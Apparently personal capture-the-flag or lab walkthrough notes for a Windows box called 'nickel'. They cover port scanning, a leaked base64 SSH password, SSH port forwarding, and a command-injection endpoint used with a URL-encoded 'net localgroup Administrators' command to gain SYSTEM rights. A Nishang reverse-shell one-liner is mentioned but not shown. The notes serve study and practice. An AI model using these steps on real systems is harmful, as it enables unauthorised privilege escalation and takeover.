nmap shows ports 21 ftp, 22 ssh, 135 rpc, 139 netbios, 445 smb, 3389 rdp, 5040?? , 7680 pando-pub, 8089 web, 33333 web

ports 21-445 all locked down

port 5040-

port 7680-

port 8089-
making requests to some internal IP, port 33333
changed the IP to 33333, but it did not work
HINT TAKEN : capture the req to the IP:33333 and convert it to post

we do it, and upon sending POST req, we see
```
name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
```
it is a base64-encoded ssh password for ariah
-->NowiseSloopTheory139
ssh ariah@IP

---
ariah!

we see internal ports 80 and 1417(ftp) listening

HINT TAKEN : the pdf file we ignored in \ftp is of significance. also, we can use the list running processes from the web interface:33333 to see processes, since powershell isnt allowing it directly

opening the pdf, we see "Temporary Command endpoint: http://nickel/?"
this would mean the internal port 80 can be used for command injection

So we do the port forwarding
`ssh -L 80:127.0.0.1:80 ariah@192.168.138.99`
and we can now access the endpoint on our browzer `http://127.0.0.1/`
`?whoami` says NT Authority
now, add ariah to local administrator group
`?net%20localgroup%20Administrators%20ariah%20%2Fadd`

OR, just send URL-encoded Nishaang's 1 liner powershell into ? and get NT Authority on port 21, easy